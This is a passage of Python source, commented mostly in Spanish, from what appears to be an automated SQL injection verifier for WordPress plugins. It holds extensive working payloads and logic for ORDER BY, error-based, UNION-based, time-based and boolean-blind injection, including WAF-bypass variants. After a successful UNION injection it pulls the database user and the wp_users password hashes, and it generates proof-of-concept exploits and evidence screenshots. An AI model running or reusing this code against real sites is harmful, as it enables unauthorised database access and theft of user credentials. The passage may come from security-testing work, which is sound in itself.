                f"{_ob_col_prefix},(SELECT updatexml(1,concat(0x7e,version()),1))",
                ",(SELECT extractvalue(1,concat(0x7e,version())))",
                ",(SELECT updatexml(1,concat(0x7e,version()),1))",
                "(SELECT extractvalue(1,concat(0x7e,version())))",
                "(SELECT updatexml(1,concat(0x7e,version()),1))",
            ]
            for _ob_p in _ob_payloads_fp:
                try:
                    _ob_r = send(_ob_p)
                except Exception:
                    continue
                _ob_vers = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", _ob_r.text or "")
                            if _is_plausible_mysql_ver(v)} - version_noise
                if _ob_vers:
                    _mysql_ver = sorted(_ob_vers)[0]
                    res.verified = True
                    res.ok = True
                    res.confidence = "confirmed"
                    res.evidence["tecnica"] = "orderby-error-based"
                    res.evidence["payload_ganador"] = _ob_p
                    res.evidence["mysql_version_extraida"] = _mysql_ver
                    res.detail = (
                        f"SQLI confirmada (ORDER BY error-based fast-path): "
                        f"{sqli_param}={_ob_p!r} → extractvalue/updatexml evaluado "
                        f"como item de ORDER BY filtró version() real = {_mysql_ver}"
                    )
                    step(f"VERIFICADO (ORDER BY error-based): {_mysql_ver} en la respuesta")
                    _poc_params = dict(base_params); _poc_params[sqli_param] = _ob_p
                    res.exploit_poc = _build_exploit_poc(
                        base_url=boot.base_url, endpoint=endpoint, method=m,
                        params=_poc_params, json_body=json_body,
                        technique="ORDER BY error-based SQLi",
                        description=(f"ORDER BY error-based SQLi on '{sqli_param}': "
                                     f"MySQL {_mysql_ver} leaked via extractvalue() in ORDER BY. "
                                     f"Replace TARGET with the real host."))
                    break
            if res.verified:
                return res  # early exit — ORDER BY fast-path confirmed

            # ORDER BY time-based fast-path: if error-based ORDER BY failed, try SLEEP.
            # Patterns: col AND SLEEP(5), col,(SELECT 1 FROM (SELECT SLEEP(5))x),
            # CASE WHEN 1=1 THEN col ELSE (SELECT SLEEP(5)) END.
            # Always tried BEFORE the generic WHERE time-based path so we don't burn
            # budget on quote-based payloads that can't work in ORDER BY context.
            step("[ORDER BY time-based] probando SLEEP en contexto ORDER BY...")
            _ob_time_pairs = [
                (f"{_ob_col_prefix} AND SLEEP(5)",
                 f"{_ob_col_prefix} AND SLEEP(0)"),
                (f"{_ob_col_prefix} AND (SELECT 1471 FROM (SELECT(SLEEP(5)))x)",
                 f"{_ob_col_prefix} AND (SELECT 1471 FROM (SELECT(SLEEP(0)))x)"),
                (f"{_ob_col_prefix},(SELECT 1 FROM (SELECT(SLEEP(5)))x)",
                 f"{_ob_col_prefix},(SELECT 1 FROM (SELECT(SLEEP(0)))x)"),
                (f"CASE WHEN 1=1 THEN {_ob_col_prefix} ELSE (SELECT SLEEP(5)) END",
                 f"CASE WHEN 1=2 THEN {_ob_col_prefix} ELSE (SELECT SLEEP(0)) END"),
                (f"IF(1=1,{_ob_col_prefix},(SELECT SLEEP(5)))",
                 f"IF(1=2,{_ob_col_prefix},(SELECT SLEEP(0)))"),
            ]
            _ob_time_tried = []
            for _ob_slow, _ob_fast in _ob_time_pairs:
                try:
                    import time as _time_mod
                    _t0f = _time_mod.time(); send(_ob_fast); _tf = _time_mod.time() - _t0f
                    _t0s = _time_mod.time(); send(_ob_slow); _ts = _time_mod.time() - _t0s
                except Exception as _e:
                    _ob_time_tried.append({"slow": _ob_slow, "fast": _ob_fast, "error": str(_e)})
                    continue
                _delayed = (_ts - _tf) >= 3.5
                _ob_time_tried.append({"slow": _ob_slow, "fast": _ob_fast,
                                        "slow_s": round(_ts, 2), "fast_s": round(_tf, 2),
                                        "retraso": _delayed})
                if _delayed:
                    res.verified = True; res.ok = True; res.confidence = "confirmed"
                    res.evidence.update({"tecnica": "orderby-time-based",
                                         "payload_ganador": _ob_slow,
                                         "slow_s": round(_ts, 2), "fast_s": round(_tf, 2),
                                         "ob_timing_intentos": _ob_time_tried})
                    res.detail = (f"SQLI confirmada (ORDER BY time-based): "
                                  f"{sqli_param}={_ob_slow!r} tardó {_ts:.2f}s vs "
                                  f"control {_ob_fast!r} en {_tf:.2f}s")
                    step(f"VERIFICADO (ORDER BY time-based): {_ts:.2f}s vs {_tf:.2f}s")
                    _poc_p2 = dict(base_params); _poc_p2[sqli_param] = _ob_slow
                    res.exploit_poc = _build_exploit_poc(
                        base_url=boot.base_url, endpoint=endpoint, method=m,
                        params=_poc_p2, json_body=json_body,
                        technique="ORDER BY time-based SQLi",
                        description=(f"ORDER BY time-based SQLi on '{sqli_param}': "
                                     f"SLEEP(5) in ORDER BY caused {_ts:.2f}s delay. "
                                     f"Replace TARGET with the real host."))
                    break
            res.evidence["ob_timing_intentos"] = _ob_time_tried
            if res.verified:
                return res  # ORDER BY time-based confirmed

        step("probando error-based (extractvalue/updatexml) para extraer version() real...")
        error_tried = []
        error_found = None
        # Standard payloads: inject with comment suffix (works when '--' doesn't break outer grouping)
        # BETWEEN-safe payloads: no comment, closed with AND '1 so the multi-BETWEEN structure stays
        # syntactically valid across multiple occurrences of $param in one query (e.g. My Calendar).
        error_payloads_extra = [
            (f"{orig_value}' AND extractvalue(1,concat(0x7e,version())) AND '1",),
            (f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1) AND '1",),
            (f"{orig_value}') AND extractvalue(1,concat(0x7e,version())) AND ('1",),
            (f"{orig_value}') AND updatexml(1,concat(0x7e,version()),1) AND ('1",),
        ]
        for ctx in contexts:
            for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
                for cm in comments:
                    payload_val = f"{orig_value}{ctx} AND {fn}{cm}"
                    try:
                        r = send(payload_val)
                    except Exception as e:
                        error_tried.append({"payload": payload_val, "error": str(e)})
                        continue
                    new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                    error_tried.append({"payload": payload_val, "status": r.status_code,
                                        "version_nueva": sorted(new_versions),
                                        "respuesta_cuerpo_recorte": (r.text or "")[:300]})
                    if new_versions:
                        error_found = (payload_val, sorted(new_versions)[0], r)
                        break
                if error_found:
                    break
            if error_found:
                break
        # BETWEEN-safe no-comment variants (try after the standard set)
        if not error_found:
            for (payload_val,) in error_payloads_extra:
                try:
                    r = send(payload_val)
                except Exception as e:
                    error_tried.append({"payload": payload_val, "error": str(e)})
                    continue
                new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                error_tried.append({"payload": payload_val, "status": r.status_code,
                                    "version_nueva": sorted(new_versions),
                                    "respuesta_cuerpo_recorte": (r.text or "")[:300]})
                if new_versions:
                    error_found = (payload_val, sorted(new_versions)[0], r)
                    break

        # WAF bypass round: if standard error-based payloads failed AND budget allows,
        # try obfuscated variants (comment injection, case mixing, MySQL inline comments,
        # tab whitespace, char() encoding). Generic — works for any SQLi target.
        import time as _time_waf
        _waf_budget_ok = not error_found and (budget_s - (_time_waf.time() - t0)) > 60
        if _waf_budget_ok:
            step("error-based estandar fallo — intentando variantes WAF-bypass...")
            waf_tried = []
            for ctx in contexts:
                for fn in ("extractvalue(1,concat(0x7e,version()))",
                           "updatexml(1,concat(0x7e,version()),1)"):
                    for cm in comments:
                        for waf_payload in _waf_expand_sqli_payloads(orig_value, fn, ctx, cm):
                            try:
                                r = send(waf_payload)
                            except Exception as e:
                                waf_tried.append({"payload": waf_payload, "error": str(e)})
                                continue
                            new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b",
                                            r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                            waf_tried.append({"payload": waf_payload, "status": r.status_code,
                                              "version_nueva": sorted(new_versions),
                                              "respuesta_cuerpo_recorte": (r.text or "")[:300]})
                            if new_versions:
                                error_found = (waf_payload, sorted(new_versions)[0], r)
                                break
                            if (budget_s - (_time_waf.time() - t0)) <= 15:
                                break
                        if error_found:
                            break
                    if error_found:
                        break
                if error_found:
                    break
            error_tried.extend(waf_tried)
            if error_found:
                step(f"WAF bypass exitoso: {len(waf_tried)} variantes probadas, payload obfuscado funciono")
            else:
                step(f"WAF bypass: {len(waf_tried)} variantes probadas, ninguna filtro version()")

        if error_found:
            payload_val, mysql_version, r = error_found
            res.verified = True
            res.ok = True
            res.confidence = "confirmed"
            res.evidence["tecnica"] = "error-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["error_based_intentos"] = error_tried
            res.detail = (f"SQLI confirmada (error-based): la peticion con {sqli_param}=... "
                          f"provoco un error de sintaxis (extractvalue/updatexml) cuyo mensaje "
                          f"incluyo la version real de la base de datos ({mysql_version}) -- "
                          f"dato real forzado a salir en un mensaje de error, no una coincidencia")
            step(f"VERIFICADO (error-based): version real del motor filtrada en el mensaje de "
                 f"error: {mysql_version}")
            _poc_params = dict(base_params); _poc_params[sqli_param] = payload_val
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_poc_params, json_body=json_body, technique="error-based SQLi",
                description=f"Error-based SQLi on '{sqli_param}': MySQL {mysql_version} leaked via extractvalue(). Replace TARGET with the real host.")
            # Captura de evidencia de explotacion: HTTP estructurada + terminal shot
            _exploit_body = (r.text or "")[:6000]
            # 1) HTTP capture (Burp panel) — siempre, con la response real
            _capture_exploit_shot(
                boot, m, endpoint, r,
                highlight=mysql_version,
                caption_es=(f"Paso 5 (CLAVE): SQL INJECTION — peticion con payload "
                            f"{sqli_param}={payload_val!r} → error XPATH revela "
                            f"version() = {mysql_version}"),
                caption_en=(f"Step 5 (KEY): SQL INJECTION — payload "
                            f"{sqli_param}={payload_val!r} → XPATH error leaks "
                            f"version() = {mysql_version}"))
            # 2) Terminal shot mostrando la extraccion de version — siempre visible sin browser
            _error_lines = []
            for _ln in _exploit_body.splitlines():
                if mysql_version in _ln or "wpdberror" in _ln or "XPATH" in _ln:
                    _error_lines.append(_ln.strip()[:200])
                if len(_error_lines) >= 8:
                    break
            _error_snippet = "\n".join(_error_lines) or _exploit_body[:400]
            _term_content = (
                f"SQL INJECTION CONFIRMADA (error-based)\n"
                f"{'─'*52}\n"
                f"Parametro vulnerable : {sqli_param}\n"
                f"Payload              : {sqli_param}={payload_val}\n"
                f"Tecnica              : extractvalue(1,concat(0x7e,version()))\n"
                f"Version MySQL        : {mysql_version}   <-- DATO REAL\n"
                f"Endpoint             : {m} {endpoint}\n"
                f"Status HTTP          : {r.status_code}\n"
                f"{'─'*52}\n"
                f"Fragmento del error en la respuesta:\n\n"
                + _error_snippet
            )
            _capture_terminal_shot(
                boot, title="SQL INJECTION — version extraida", content=_term_content,
                highlight=mysql_version,
                caption_es=(f"Paso 5b: VERSION MySQL EXTRAIDA — {mysql_version} visible "
                            f"en el error XPATH de la respuesta. Explotacion confirmada."),
                caption_en=(f"Step 5b: MySQL VERSION EXTRACTED — {mysql_version} visible "
                            f"in XPATH error of the response. Exploitation confirmed."),
                url=boot.base_url + endpoint)
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res
        # se guarda la lista COMPLETA de intentos (con el cuerpo real de cada respuesta), no solo
        # un resumen -- confirmado en vivo, CVE-2024-3552: sin esto, un negativo era indiagnosticable
        # sin relanzar el ataque a mano para ver que contestaba el servidor de verdad.
        res.evidence["error_based_intentos"] = error_tried
        res.evidence["error_based_intentos_resumen"] = (f"{len(error_tried)} combinaciones "
                                                         f"probadas, ninguna filtro version()")
        _ctrl_causa_eb = _quick_causa(res.evidence.get("respuesta_control_recorte", ""),
                                      base_resp.status_code)
        step(f"[técnica error-based] FALLO: {len(error_tried)} payloads probados, "
             f"ninguno filtró version() — control: status={base_resp.status_code} "
             f"{base_len}B causa={_ctrl_causa_eb}")
        res.failure_trace.append({
            "attempt_n": 1, "technique": "error-based", "endpoint": endpoint,
            "param": sqli_param, "causa": _ctrl_causa_eb,
            "detail": f"{len(error_tried)} payloads, ninguno filtró version()",
            "diff_bytes": 0,
        })

        step("error-based no filtro nada; probando UNION-based (fuerza bruta de columnas) para "
             "extraer version() real...")
        union_tried = []
        union_found = None
        for ctx in contexts:
            for cm in comments:
                for n in range(1, 9):
                    for pos in range(n):
                        cols = ["NULL"] * n
                        cols[pos] = "version()"
                        payload_val = f"{orig_value}{ctx} UNION SELECT {','.join(cols)}{cm}"
                        try:
                            r = send(payload_val)
                        except Exception as e:
                            union_tried.append({"payload": payload_val, "error": str(e)})
                            continue
                        new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                        union_tried.append({"payload": payload_val, "status": r.status_code,
                                            "version_nueva": sorted(new_versions)})
                        if new_versions:
                            union_found = (payload_val, sorted(new_versions)[0], r)
                            break
                    if union_found:
                        break
                if union_found:
                    break
            if union_found:
                break

        if union_found:
            payload_val, mysql_version, r = union_found
            res.verified = True
            res.ok = True
            res.confidence = "confirmed"
            res.evidence["tecnica"] = "union-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["union_intentos"] = union_tried
            res.detail = (f"SQLI confirmada (UNION-based): la peticion con {sqli_param}=... hizo "
                          f"que la base de datos devolviera su version real ({mysql_version}) "
                          f"dentro de la respuesta -- version() nunca aparece en una respuesta "
                          f"normal, es dato extraido de verdad, no una deduccion por diferencia "
                          f"de contenido")
            step(f"VERIFICADO (UNION-based): version real del motor filtrada en la respuesta: "
                 f"{mysql_version}")
            _poc_params = dict(base_params); _poc_params[sqli_param] = payload_val
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_poc_params, json_body=json_body, technique="UNION-based SQLi",
                description=f"UNION-based SQLi on '{sqli_param}': MySQL {mysql_version} extracted via UNION SELECT. Replace TARGET with the real host.")
            _exploit_body_u = (r.text or "")[:6000]
            # 1) HTTP capture (Burp panel)
            _capture_exploit_shot(
                boot, m, endpoint, r,
                highlight=mysql_version,
                caption_es=(f"Paso 5 (CLAVE): SQL INJECTION UNION-based — payload "
                            f"{sqli_param}={payload_val!r} → version() = {mysql_version}"),
                caption_en=(f"Step 5 (KEY): SQL INJECTION UNION-based — payload "
                            f"{sqli_param}={payload_val!r} → version() = {mysql_version}"))
            # 2) Terminal shot con la version extraida
            _u_lines = []
            for _ln in _exploit_body_u.splitlines():
                if mysql_version in _ln:
                    _u_lines.append(_ln.strip()[:200])
                if len(_u_lines) >= 6:
                    break
            _u_snippet = "\n".join(_u_lines) or _exploit_body_u[:400]
            _term_content_u = (
                f"SQL INJECTION CONFIRMADA (UNION-based)\n"
                f"{'─'*52}\n"
                f"Parametro vulnerable : {sqli_param}\n"
                f"Payload              : {sqli_param}={payload_val}\n"
                f"Tecnica              : UNION SELECT version()\n"
                f"Version MySQL        : {mysql_version}   <-- DATO REAL\n"
                f"Endpoint             : {m} {endpoint}\n"
                f"Status HTTP          : {r.status_code}\n"
                f"{'─'*52}\n"
                f"version() en la respuesta:\n\n"
                + _u_snippet
            )
            _capture_terminal_shot(
                boot, title="SQL INJECTION UNION — version extraida", content=_term_content_u,
                highlight=mysql_version,
                caption_es=(f"Paso 5b: VERSION MySQL EXTRAIDA (UNION) — {mysql_version} "
                            f"filtrada en la respuesta HTTP. Explotacion confirmada."),
                caption_en=(f"Step 5b: MySQL VERSION EXTRACTED (UNION) — {mysql_version} "
                            f"leaked in HTTP response. Exploitation confirmed."),
                url=boot.base_url + endpoint)
            # Post-UNION data extraction: reuse the confirmed column count/position
            # to dump user(), @@hostname, and wp_users hashes via HTTP (not docker exec).
            try:
                _n_cols = payload_val.count(",") + 1  # rough column count from payload
                _pos = 0
                # find which position has version()
                for _ci, _col in enumerate(payload_val.split("UNION SELECT ", 1)[-1]
                                           .split("--")[0].split("-")[0].split(",") if "UNION SELECT" in payload_val else []):
                    if "version()" in _col.lower():
                        _pos = _ci
                        break

                def _union_extract(expr: str) -> str:
                    _cols2 = ["NULL"] * _n_cols
                    _cols2[_pos] = expr
                    _p2 = f"{orig_value}{payload_val.split('UNION SELECT')[0].split(orig_value)[-1]} UNION SELECT {','.join(_cols2)}-- -"
                    try:
                        _r2 = send(_p2)
                        return (_r2.text or "")[:500]
                    except Exception:
                        return ""

                _user_body = _union_extract("user()")
                if "@" in _user_body or "root" in _user_body.lower():
                    _m_user = re.search(r"[a-z_]+@[a-z%_]+", _user_body, re.I)
                    if _m_user:
                        res.evidence["db_user"] = _m_user.group(0)
                        step(f"  union-extra: DB user = {res.evidence['db_user']!r}")

                _hashes_body = _union_extract(
                    "group_concat(user_email,0x3a,user_pass separator 0x0a) "
                    "FROM wp_users-- ")
                if "$P$" in _hashes_body or "$1$" in _hashes_body:
                    res.evidence["wp_users_hashes"] = _hashes_body[:300]
                    step("  union-extra: wp_users hashes filtrados via HTTP UNION")
            except Exception:
                pass

            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res

        res.evidence["union_intentos"] = union_tried
        res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
                                                   f"ninguna filtro version()")
        step(f"[técnica UNION-based] FALLO: {len(union_tried)} payloads probados, "
             f"ninguno filtró version() en la respuesta")
        res.failure_trace.append({
            "attempt_n": 2, "technique": "UNION-based", "endpoint": endpoint,
            "param": sqli_param, "causa": "version_no_filtrada",
            "detail": f"{len(union_tried)} combinaciones, ninguna filtró version()",
            "diff_bytes": 0,
        })
        step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
        # sqli_via_rawurldecode: la columna pasa por rawurldecode() tras sanitize_title(),
        # por lo que un apostrofo literal es filtrado pero %27 (enviado como %2527 en wire
        # via requests) llega como %27 a PHP y rawurldecode() lo convierte en '.
        _rq = "%27" if sqli_via_rawurldecode else "'"
        if sqli_via_rawurldecode:
            pairs = [
                (f"{orig_value}{_rq} AND (1=1)-- ", f"{orig_value}{_rq} AND (1=2)-- "),
                (f"{orig_value}{_rq} AND 1=1-- ", f"{orig_value}{_rq} AND 1=2-- "),
                (f"{orig_value}{_rq} OR 1=1-- ", f"{orig_value}{_rq} OR 1=2-- "),
                (f"{orig_value}{_rq} AND (SELECT 1 FROM DUAL)=1-- ", f"{orig_value}{_rq} AND (SELECT 1 FROM DUAL)=0-- "),
                (f"{orig_value}{_rq} OR 1=1#", f"{orig_value}{_rq} OR 1=2#"),
            ]
        else:
            pairs = [
                (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
                (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
                (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
                (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
                (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
                # IN-clause injection: closes the in() paren, adds OR/AND after
                # e.g. meta.meta_value in (1) OR 1=1-- -) for CVE-2024-1512
                (f"{orig_value}) OR 1=1-- -", f"{orig_value}) AND 1=2-- -"),
                (f"{orig_value}') OR 1=1-- -", f"{orig_value}') AND 1=2-- -"),
            ]
        bool_tried = []
        consistent_diffs = 0
        for true_p, false_p in pairs:
            try:
                rt = send(true_p)
                rf = send(false_p)
            except Exception as e:
                bool_tried.append({"true": true_p, "false": false_p, "error": str(e)})
                continue
            lt, lf = len(rt.text or ""), len(rf.text or "")
            # Para respuestas pequenas (<100B), el threshold absoluto de 20B seria demasiado grande
            # (p.ej. rsvpmaker devuelve 4B=true vs 5B=false -- diferencia de 1B real).
            # Se usa max(0.5, 5% del base) para ser sensible incluso a diferencias de 1 byte.
            threshold = max(0.5, 0.05 * base_len) if base_len < 100 else max(20, 0.05 * base_len)
            differs = (rt.status_code != rf.status_code) or (abs(lt - lf) > threshold)
            # Anclar al baseline: al menos UNO de los dos debe ser cercano al control.
            # Para pares AND: TRUE ≈ control, FALSE < control.
            # Para pares OR: FALSE ≈ control, TRUE >> control (devuelve todos los rows).
            # Solo verificar TRUE ≈ control filtraba validamente pares OR con tablas llenas.
            true_near_base = abs(lt - base_len) <= threshold
            false_near_base = abs(lf - base_len) <= threshold
            matches_base = true_near_base or false_near_base
            bool_tried.append({"true": true_p, "false": false_p, "status_true": rt.status_code,
                               "status_false": rf.status_code, "len_true": lt, "len_false": lf,
                               "difiere": differs, "true_coincide_con_base": true_near_base,
                               "false_coincide_con_base": false_near_base,
                               "respuesta_true_recorte": (rt.text or "")[:300]})
            if differs and matches_base:
                consistent_diffs += 1
        res.evidence["boolean_intentos"] = bool_tried

        # Empty-expansion check: when control is empty or a JSON wrapper with empty list,
        # the standard `matches_base` guard filters out OR payloads that do expand.
        # Trigger for: [] {} empty "" null, and {"data":[],"total":0}-style wrappers ≤150B.
        _ctrl_body_txt = getattr(base_resp, "text", "") or ""
        _ctrl_is_empty = (base_len <= 5 or
                          (base_len <= 150 and bool(re.search(r':\s*\[\s*\]', _ctrl_body_txt))))
        if consistent_diffs < 2 and _ctrl_is_empty:
            _exp_pairs = [
                (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
                (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
                (f"{orig_value} OR 1=1-- -", f"{orig_value} OR 1=2-- -"),
                (f"{orig_value}' OR 1=1-- -", f"{orig_value}' OR 1=2-- -"),
                # IN-clause: closes in() bracket then OR/AND
                (f"{orig_value}) OR 1=1-- -", f"{orig_value}) AND 1=2-- -"),
                (f"{orig_value}') OR 1=1-- -", f"{orig_value}') AND 1=2-- -"),
            ]
            for _exp_t, _exp_f in _exp_pairs:
                try:
                    _rt_exp = send(_exp_t); _rf_exp = send(_exp_f)
                    _lt_exp = len(_rt_exp.text or ""); _lf_exp = len(_rf_exp.text or "")
                    if (_lt_exp > _lf_exp and _lt_exp >= 8 and (_lt_exp - _lf_exp) >= 6):
                        res.verified = True; res.ok = True
                        res.confidence = "probable"
                        res.evidence.update({
                            "tecnica": "boolean-blind-empty-expansion",
                            "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint,
                            "true_payload": _exp_t, "false_payload": _exp_f,
                            "len_true": _lt_exp, "len_false": _lf_exp, "len_control": base_len,
                        })
                        res.detail = (
                            f"SQLI CONFIRMADO (boolean-blind OR-expansion): "
                            f"OR 1=1 retorno {_lt_exp}B, OR 1=2 retorno {_lf_exp}B "
                            f"(control={base_len}B) — resultados se expanden con OR 1=1"
                        )
                        step(f"VERIFICADO empty-expansion: TRUE={_lt_exp}B FALSE={_lf_exp}B ctrl={base_len}B")
                        _poc_params = dict(base_params); _poc_params[sqli_param] = _exp_t
                        res.exploit_poc = _build_exploit_poc(
                            base_url=boot.base_url, endpoint=endpoint, method=m,
                            params=_poc_params, json_body=json_body,
                            technique="boolean-blind SQLi (OR-expansion)")
                        return res
                except Exception:
                    continue

        if consistent_diffs >= 2:
            res.verified = True
            res.ok = True
            res.confidence = "probable"
            res.evidence["tecnica"] = "boolean-blind-differential"
            # Capture TRUE/FALSE response sizes for report generation
            # Accept both AND-pairs (true≈control) and OR-pairs (false≈control).
            _winning_pair = next(
                (e for e in bool_tried if e.get("difiere") and
                 (e.get("true_coincide_con_base") or e.get("false_coincide_con_base"))),
                None)
            if _winning_pair:
                res.evidence["respuesta_true_len"] = _winning_pair.get("len_true", 0)
                res.evidence["respuesta_false_len"] = _winning_pair.get("len_false", 0)
                res.evidence["payload_ganador"] = _winning_pair.get("true", "")
            res.detail = (f"SQLI probable (boolean-blind, diferencial): {consistent_diffs}/"
                          f"{len(pairs)} pares TRUE/FALSE mostraron una diferencia consistente de "
                          f"respuesta (y el caso TRUE se comporto como la peticion de control) -- "
                          f"indicio fuerte de inyeccion ciega, aunque sin dato extraido literal "
                          f"(menos duro que el UNION/error-based)")
            step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
                 f"diferencia consistente")
            _bool_winning = next((e["true"] for e in bool_tried if e.get("difiere") and e.get("true_coincide_con_base")), pairs[0][0])
            _poc_params = dict(base_params); _poc_params[sqli_param] = _bool_winning
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_poc_params, json_body=json_body, technique="boolean-blind SQLi",
                description=f"Boolean-blind SQLi on '{sqli_param}': TRUE condition returns different response size than FALSE. Replace TARGET with the real host.")
            # Screenshot terminal con diferencial TRUE/FALSE
            _true_len = res.evidence.get("respuesta_true_len", 0)
            _false_len = res.evidence.get("respuesta_false_len", 0)
            _capture_terminal_shot(
                boot, "binoracle · Boolean-blind SQLi — TRUE/FALSE differential",
                content=(f"[BOOLEAN-BLIND SQLi CONFIRMED]\n"
                         f"Parameter: {sqli_param}\n"
                         f"TRUE payload:  {_bool_winning!r}\n"
                         f"TRUE response:  {_true_len} bytes (matches control baseline)\n"
                         f"FALSE response: {_false_len} bytes (consistently different)\n"
                         f"Pairs confirmed: {consistent_diffs}/{len(pairs)}\n\n"
                         f"The server produces different response sizes for TRUE vs FALSE\n"
                         f"SQL conditions, confirming the parameter is interpreted as SQL."),
                highlight="CONFIRMED",
                caption_es=(f"Paso 5 (CLAVE): SQLi BOOLEAN-BLIND CONFIRMADA — diferencial "
                            f"TRUE ({_true_len}B) vs FALSE ({_false_len}B) consistente en "
                            f"{consistent_diffs}/{len(pairs)} pares. Param: {sqli_param}"),
                caption_en=(f"Step 5 (KEY): BOOLEAN-BLIND SQLi CONFIRMED — TRUE ({_true_len}B) "
                            f"vs FALSE ({_false_len}B) differential in {consistent_diffs}/{len(pairs)} pairs."),
                url=boot.base_url + endpoint)
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res

        # Content-diff boolean: cuando base_len es grande (>10KB) el threshold del 5% (>500B)
        # oculta diferencias reales de contenido muy pequeñas (p.ej. un var_dump de 40B que
        # aparece en FALSE pero no en TRUE). En lugar de comparar TAMAÑO, buscamos tokens/strings
        # que aparezcan en la respuesta FALSE pero no en TRUE (o viceversa) de forma consistente.
        # Se activa solo cuando el diferencial de tamaño falló completamente (consistent_diffs==0)
        # y base_len > 10KB para evitar falsos positivos en respuestas cortas.
        if consistent_diffs == 0 and base_len > 10_000 and bool_tried:
            _content_consistent = 0
            _content_trigger_pair = None
            for _entry in bool_tried:
                _rt_text = _entry.get("respuesta_true_recorte", "")
                # necesitamos el texto completo de TRUE y FALSE para content-diff
                # bool_tried solo guarda recorte de TRUE; re-enviamos el primer par
                # que tenga respuestas válidas (sin error) para hacer diff completo
                if _entry.get("error") or not _rt_text:
                    continue
                _true_p = _entry.get("true", "")
                _false_p = _entry.get("false", "")
                try:
                    _rt2 = send(_true_p)
                    _rf2 = send(_false_p)
                    _rt2_text = _rt2.text or ""
                    _rf2_text = _rf2.text or ""

                    # Normalizar antes de comparar: eliminar tokens variables que no son
                    # señal de la inyección (timestamps Unix, nonces WP, campos JSON
                    # que cambian por request). Sin esto, un "timestamp":1748546123 que
                    # difiere entre TRUE y FALSE genera falsos positivos de "token exclusivo".
                    def _norm_for_diff(txt: str) -> str:
                        import re as _re2
                        # Valores JSON de campos variables: "field": <valor>
                        txt = _re2.sub(
                            r'"(?:timestamp|generated_at|updated_at|created_at'
                            r'|nonce|_wpnonce|_token|wpnonce|time|expires|exp'
                            r'|modified|date_modified|current_time)'
                            r'"\s*:\s*(?:"[^"]{0,80}"|\d+)',
                            '"__VARFIELD__":0', txt)
                        # Unix timestamps (10 dígitos, 1xxx...xxx) como literal
                        txt = _re2.sub(r'\b1[0-9]{9}\b', '0000000000', txt)
                        # Nonces WP y tokens hex 8-40 chars (no queremos perder
                        # identificadores de base de datos, así que solo eliminamos
                        # los que aparecen como valor de atributos data-nonce, nonce=, etc.)
                        txt = _re2.sub(
                            r'(?:nonce|_wpnonce|token)(?:=|%3D|&amp;|":")[0-9a-f]{8,40}',
                            'NONCE=MASKED', txt, flags=_re2.I)
                        return txt

                    _rt2_norm = _norm_for_diff(_rt2_text)
                    _rf2_norm = _norm_for_diff(_rf2_text)

                    # Buscar tokens que aparecen solo en FALSE (mensajes de error, dumps)
                    # o solo en TRUE (datos reales de la DB)
                    _only_in_false = set()
                    _only_in_true = set()
                    # Dividir en tokens de >=6 chars para evitar ruido
                    _tok_true = {w for w in _rt2_norm.split() if len(w) >= 6}
                    _tok_false = {w for w in _rf2_norm.split() if len(w) >= 6}
                    _only_in_false = _tok_false - _tok_true
                    _only_in_true = _tok_true - _tok_false
                    # Señal válida: hay tokens exclusivos de una respuesta y no de la otra
                    # AND el status code es el mismo (descartamos redirecciones/403)
                    _tok_diff_count = len(_only_in_false) + len(_only_in_true)
                    # Señal secundaria: diferencia en los primeros 200B del body (donde suele
                    # aparecer var_dump / error PHP antes del HTML normal). Detecta textos cortos
                    # como `string(28) "Can't not get the order"` que tienen pocos tokens >=6chars.
                    _head_true = _rt2_norm[:200]
                    _head_false = _rf2_norm[:200]
                    _head_differs = (_head_true != _head_false and
                                     abs(len(_head_true) - len(_head_false)) >= 5)
                    _status_ok = (_rt2.status_code == _rf2.status_code)
                    if ((_tok_diff_count >= 2 or _head_differs)
                            and _status_ok):
                        _content_consistent += 1
                        if _content_trigger_pair is None:
                            _content_trigger_pair = {
                                "true": _true_p, "false": _false_p,
                                "tokens_solo_false": sorted(_only_in_false)[:5],
                                "tokens_solo_true": sorted(_only_in_true)[:5],
                                "tok_diff_count": _tok_diff_count,
                                "head_differs": _head_differs,
                            }
                        # Señal fuerte: muchos tokens exclusivos O diferencia en el head del body
